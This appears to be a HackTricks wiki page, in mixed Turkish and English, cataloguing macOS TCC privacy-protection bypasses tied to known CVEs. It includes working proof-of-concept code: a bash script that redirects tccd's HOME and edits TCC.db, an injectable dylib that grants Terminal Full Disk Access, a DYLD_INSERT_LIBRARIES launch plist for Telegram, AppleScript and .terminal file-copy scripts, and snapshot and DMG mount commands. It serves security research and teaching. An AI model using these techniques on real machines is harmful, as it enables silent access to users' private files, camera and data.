# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; TCC'nin çalışma şekli böyledir: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma erişimi yoksa bile, buraya yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`**, yeni **file**'a **creators app**'in onu okumasına erişim sağlamak için eklenir.

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC prompt'unun üzerine bir pencere yerleştirmek** mümkündür. PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** içinde bulabilirsiniz.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker, **`Info.plist`** içinde **herhangi bir isimle** (ör. Finder, Google Chrome...) **apps oluşturabilir** ve bunların bazı TCC protected location'lara erişim talep etmesini sağlayabilir. Kullanıcı, bu erişimi talep edenin meşru application olduğunu düşünecektir.\
Ayrıca, meşru app'i Dock'tan **kaldırıp fake app'i onun yerine koymak** da mümkündür. Böylece kullanıcı, aynı icon'u kullanabilen fake app'e tıkladığında fake app meşru app'i çağırabilir, TCC permissions talep edebilir ve bir malware çalıştırabilir; bu da kullanıcının erişimi meşru app'in talep ettiğine inanmasını sağlar.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access"** özelliğine sahipti. Bunu devre dışı bırakmak için erişimin listelenmiş ancak disabled olması gerekir (listeden kaldırmak bu privileges'ı kaldırmaz):

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Burada bazı **malware'lerin bu protection'ı nasıl bypass edebildiğine** dair örnekler bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> SSH'yi etkinleştirebilmek için artık **Full Disk Access** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute'u, **belirli bir application'a onu okuma permissions'ı vermek için** files'a verilir. Bu attribute, bir file'ı bir app'in üzerine **drag\&drop** ettiğinizde veya bir user bir file'ı **default application ile açmak için double-click** yaptığında ayarlanır.

Bu nedenle bir user, tüm extensions'ları handle etmek üzere **malicious app register edebilir** ve herhangi bir file'ı **open** etmek için Launch Services'i çağırabilir (böylece malicious file'a onu okuma access'i verilir).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı ile **iCloud tokens sağlayacak** **`com.apple.iCloudHelper`** XPC service'iyle iletişim kurulabilir.

**iMovie** ve **Garageband** bu entitlement'a ve buna izin veren diğer entitlement'lara sahipti.

Bu entitlement'tan **icloud tokens elde etmeye** yönelik exploit hakkında daha fazla **information** için şu talk'a bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission'ına sahip bir app, **diğer Apps'leri control edebilir**. Bu, **diğer Apps'lere verilen permissions'ları abuse edebileceği** anlamına gelir.

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir App'in **`iTerm` üzerinde Automation permission'ı** varsa, bu örnekte **`Terminal` iTerm üzerinde access'e** sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA'si olmayan Terminal, iTerm'ı çağırabilir; iTerm FDA'ye sahip olduğundan Terminal bunu actions gerçekleştirmek için kullanabilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Ya da bir App'in Finder üzerinden erişimi varsa, bunun gibi bir script çalıştırabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## By App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon**, TCC kullanıcı veritabanına şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)'a göre ve TCC daemon'ı mevcut kullanıcının domain'i içinde `launchd` aracılığıyla çalıştığından, kendisine aktarılan **tüm environment değişkenlerini kontrol etmek** mümkündür.\
Böylece bir **attacker**, **`launchctl`** içinde **`$HOME` environment** değişkenini **kontrolündeki** bir **directory**'yi gösterecek şekilde ayarlayabilir, **TCC** daemon'ını yeniden başlatabilir ve ardından son kullanıcıya hiçbir zaman prompt gösterilmeden kendisine mevcut **her TCC entitlement'ını** vermek için **TCC database'ini doğrudan değiştirebilir**.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes, TCC tarafından korunan konumlara erişebiliyordu; ancak bir note oluşturulduğunda bu **korunmayan bir konumda oluşturulur**. Bu nedenle Notes'tan korunan bir dosyayı bir note'a (yani korunmayan bir konuma) kopyalamasını isteyebilir ve ardından dosyaya erişebilirdiniz:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesine sahip `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmek için **`kTCCServiceSystemPolicyAllFiles`** değerine sahip `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library"ye quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map etmek mümkündü; böylece Library içindeki tüm document'lara **erişilebiliyordu**.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a devreden uygulamalar (burada **`fileproviderd`** / **`Files.app`**) item'ları **kullanıcı adına** kopyalar veya taşır; bu nedenle copy, çağıranın yerine helper'ın yetkileriyle çalışır.

Jamf Threat Labs, işlemden önce gerçekleştirilen symlink validation işleminin **race edilebildiğini** gösterdi: symlink'i kontrol edilen path'in **son** bileşenine yerleştirmek yerine attacker, copy zaten başladıktan **sonra** path'in **ara** directory'sini değiştirir. Ardından privileged helper, attacker'ın kontrolündeki link'i takip eder ve herhangi bir prompt göstermeden TCC tarafından korunan konumları okur/yazar.

Path'lerinde random UUID ile **korunmayan** directory'ler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü attacker race işlemi için tam path'i tahmin edebilir.

> [!TIP]
> Aranması gereken generic pattern şudur: **bir path'i birden fazla kez çözen herhangi bir privileged process** (check-then-use veya source ve destination'ı ayrı ayrı çözen `rename()`/`copyfile()`) path'in ortasındaki bir directory değiştirilerek race edilebilir. Yalnızca `O_NOFOLLOW_ANY`, önceden açılmış bir directory FD üzerinde `openat()` veya `realpath()` + yeniden validation işlemi bu aralığı gerçekten kapatır.

Daha fazla bilgi için [**Jamf Threat Labs writeup'ına**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) bakın.

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'lar tarafından yönlendirilen bir logging hook ekleyen `SQLITE_ENABLE_SQLLOG` ile build edilebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database** için **database file'ın bir copy'si** ve SQL statement'larının bir log'u `path` içine yazılır (directory önceden mevcut olmalıdır).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bir DB her açıldığında/attach edildiğinde mevcut copy'yi yeniden kullanmak yerine **yeni bir copy** oluşturur.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında `<database>-sqllog` file'ı varsa bir connection log'lanır.

Bu variable'ı **FDA** sahibi olan ve SQLite database'lerini açan bir process'e inject edebilirseniz, bu process korunan database'leri kontrol ettiğiniz bir directory'ye **memnuniyetle copy'ler**. Destination filename attacker-controlled data'dan türetildiği için destination'a yerleştirilen bir **symlink**, aynı primitive'i target process'in privileges'ıyla **arbitrary file write** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

`SQLITE_AUTO_TRACE` environment variable'ı set edilirse, `libsqlite3.dylib` library'si tüm SQL query'lerini **log'lamaya** başlar. Birçok application bu library'yi kullandığından, tüm SQLite query'lerini log'lamak mümkündü.

Birçok Apple application'ı TCC tarafından korunan bilgilere erişmek için bu library'yi kullandı.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Ortam değişkenleriyle yönlendirilen dosya yazma işlemlerini arama

Önceki iki örnek aynı genel tekniğin örnekleridir ve daha fazlasını aramaya değer: **TCC-privileged uygulamalara yüklenen framework'ler genellikle process'in caller-controlled bir path'te dosya oluşturmasını sağlayan debug/logging ortam değişkenlerini açığa çıkarır**.

Bunları bulma workflow'u:

1. FDA veya başka bir değerli TCC iznine sahip bir target seçin (`Music`, `TV`, `Terminal`, MDM agents...) ve link ettiği framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` string'lerini grep ile arayın: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Aday değişkenleri `launchctl setenv NAME /path/you/control` ile ayarlayın, uygulamayı başlatın ve `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile filesystem üzerinde ne yaptığını izleyin.
4. Process sizin directory'nizde bir dosya **oluşturuyor veya yeniden adlandırıyorsa**, bir write primitive elde etmişsiniz demektir: destination'ı bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131 örneğinde olduğu gibi bir intermediate directory üzerinde race gerçekleştirin) ve işlemi `~/Library/Application Support/com.apple.TCC/TCC.db` üzerine yönlendirin.

> [!TIP]
> Bunu sınırlayan iki unsur vardır. İlk olarak, uygulama [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement'ını ("uygulamanın, app'inizin process'ine code inject etmek için kullanabileceğiniz dynamic linker environment variables'dan etkilenip etkilenemeyeceğini belirten bir Boolean value") içermediği sürece **`DYLD_*` değişkenleri hardened-runtime binary'leri tarafından yok sayılır** — ayrıca bkz. [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). İkinci olarak Apple, framework debug değişkenleri rapor edildikçe bunları tek tek kaldırır; bu nedenle bir macOS release'inde çalışan bir değişken çoğu zaman bir sonrakinde kaldırılmış olur. Bir değişkeni ayarladıktan sonra uygulama sessizce launch etmeyi reddederse, bu değişkeni zaten filtrelenmiş kabul edin.

Linker değişkenleriyle kullanılan eşdeğer trick için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) sayfasına bakın.

### Apple Remote Desktop

Root olarak bu servisi enable edebilirsiniz; böylece **ARD agent full disk access'e sahip olur** ve bir user bunu kötüye kullanarak yeni bir **TCC user database** kopyalamasını sağlayabilir.

## **NFSHomeDirectory** ile

TCC, user'a özel kaynaklara erişimi kontrol etmek için kullanıcının HOME folder'ında **$HOME/Library/Application Support/com.apple.TCC/TCC.db** konumunda bir database kullanır.\
Bu nedenle user, `$HOME` env variable'ını **farklı bir folder'ı** gösterecek şekilde ayarlayarak TCC'yi restart edebilirse, **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC database oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC izni vermesi için kandırabilir.

> [!TIP]
> Apple'ın **`NFSHomeDirectory`** attribute'unda user profile içinde saklanan ayarı **`$HOME` değeri** olarak kullandığını unutmayın; bu nedenle bu değeri değiştirme iznine sahip bir application'ı (**`kTCCServiceSystemPolicySysAdminFiles`**) compromise ederseniz, bu seçeneği bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, user'ın **HOME** folder'ını değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Target app için bir _csreq_ blob elde edin.
2. Gerekli access ve _csreq_ blob ile sahte bir _TCC.db_ dosyası yerleştirin.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile user'ın Directory Services entry'sini export edin.
4. User'ın home directory'sini değiştirmek için Directory Services entry'sini değiştirin.
5. Değiştirilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. User'ın _tccd_'sini durdurun ve process'i reboot edin.

İkinci POC, `kTCCServiceSystemPolicySysAdminFiles` değerine sahip `com.apple.private.tcc.allow` entitlement'ı bulunan **`/usr/libexec/configd`** dosyasını kullandı.\
`configd`'yi **`-t`** option'ı ile çalıştırmak mümkündü; attacker, **yüklenecek custom bir Bundle** belirtebiliyordu. Bu nedenle exploit, user'ın home directory'sini değiştirmek için kullanılan **`dsexport`** ve **`dsimport`** method'larının yerine bir **`configd` code injection** kullanır.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) sayfasına bakın.

## Process injection ile

Bir process'in içine code inject etmek ve process'in TCC privileges'larını kötüye kullanmak için farklı teknikler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ayrıca, TCC'yi bypass etmek için bulunan en yaygın process injection, **plugins (load library)** üzerinden gerçekleştirilir.\
Plugins, genellikle library veya plist biçimindeki ve **main application tarafından yüklenerek** onun context'i altında execute edilen ek code'dur. Bu nedenle main application'ın granted permissions veya entitlements aracılığıyla TCC restricted file'larına erişimi varsa, **custom code da aynı erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application'ı **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** extension'ına sahip plugins yüklüyordu ve **hardened** runtime'a sahip değildi.

Bu CVE'yi weaponize etmek için, TCC'yi bypass edecek şekilde user'ların TCC database'ini **ele geçirebilmek** amacıyla (önceki entitlement kötüye kullanılarak) **`NFSHomeDirectory` değiştirilir**.

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) sayfasına bakın.

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'si `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin veriyor**, ikincisi ise binary'ye **TCC'yi yönetme** erişimi sağlıyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` folder'ından **third party plug-ins** yüklemeye izin veriyordu. Bu nedenle, şu POC ile **bir plugin yüklemek ve TCC permissions'larını kötüye kullanmak** mümkündü:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) göz atın.

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden camera stream açan system applications (**`kTCCServiceCamera`** kullanan uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu plugin'leri process içinde yükler (SIP tarafından kısıtlanmaz).

Oraya yalnızca yaygın **constructor** içeren bir library yerleştirmek **code inject** etmek için yeterlidir.

Birkaç Apple application bu açıktan etkileniyordu.

### Firefox

Firefox application'ı `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlements'larına sahipti:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Daha fazla bilgi için bunu nasıl kolayca exploit edebileceğinizi öğrenmek üzere [**orijinal rapora bakın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlement'larına sahipti; bu da process içine code inject etmeyi ve TCC ayrıcalıklarını kullanmayı mümkün kılıyordu.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlement'larına sahipti. Bu nedenle, kamera ile kayıt yapmak gibi **uygulamanın izinlerine erişmek** için kötüye kullanılması mümkündü. [**Payload'ı writeup'ta bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: bu library'yi inject etmek üzere **custom plist** oluşturuldu ve bunu başlatmak için **`launchctl`** kullanıldı:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## `open` çağrılarıyla

Sandbox içindeyken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Scripts

Terminal’e **Full Disk Access (FDA)** vermek, en azından teknik kişiler tarafından kullanılan bilgisayarlarda, oldukça yaygındır. Bununla birlikte **`.terminal`** script'lerini çağırmak mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu aşağıdaki gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konuma bir terminal script'i yazabilir ve bunu şu şekilde bir komutla çalıştırabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mount ederek

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir kullanıcı** (yetkisiz olanlar bile) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gereken **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) bir admin tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC file üzerine mount etme

TCC DB file korunsa bile, **directory üzerine** yeni bir TCC.db file **mount etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit**'i [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) içinde inceleyin.

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) içinde açıklandığı üzere bu CVE, `diskarbitrationd`'i kötüye kullanıyordu.

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` işlevi güvenlik kontrollerini gerçekleştiriyordu. Ancak doğrudan `diskarbitrationd` çağrılarak bu kontrolleri bypass etmek ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu durum, `diskarbitrationd`'in `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde TCC database'inin üzerine mount etmek de dahil olmak üzere herhangi bir konumda arbitrary mount yapılmasına olanak sağladı.

### asr

**`/usr/sbin/asr`** tool'u, tüm diski kopyalamaya ve TCC protections'larını bypass ederek başka bir konuma mount etmeye olanak sağlıyordu.

### Location Services

**location services'a erişmesine izin verilen** client'ları belirtmek için üçüncü bir TCC database'i olan **`/var/db/locationd/clients.plist`** bulunur.\
**`/var/db/locationd/` klasörü DMG mounting işlemine karşı protected değildi**, dolayısıyla kendi plist'imizi mount etmek mümkündü.

## Startup apps ile


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Grep ile

Bazı durumlarda dosyalar email'ler, telefon numaraları, mesajlar... gibi sensitive information'ı protected olmayan konumlarda saklar (Apple açısından bu bir vulnerability olarak kabul edilir).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:

<figure><img src="../../../../../images/image (30).png alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**macOS Privacy Mechanisms'ınızı Bypass Etmenin 20+ Yolu**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**TCC'ye Karşı Ezici Zafer - MacOS Privacy Mechanisms'ınızı Bypass Etmenin 20+ YENİ Yolu**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass, iCloud'dan veri çalıyor**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
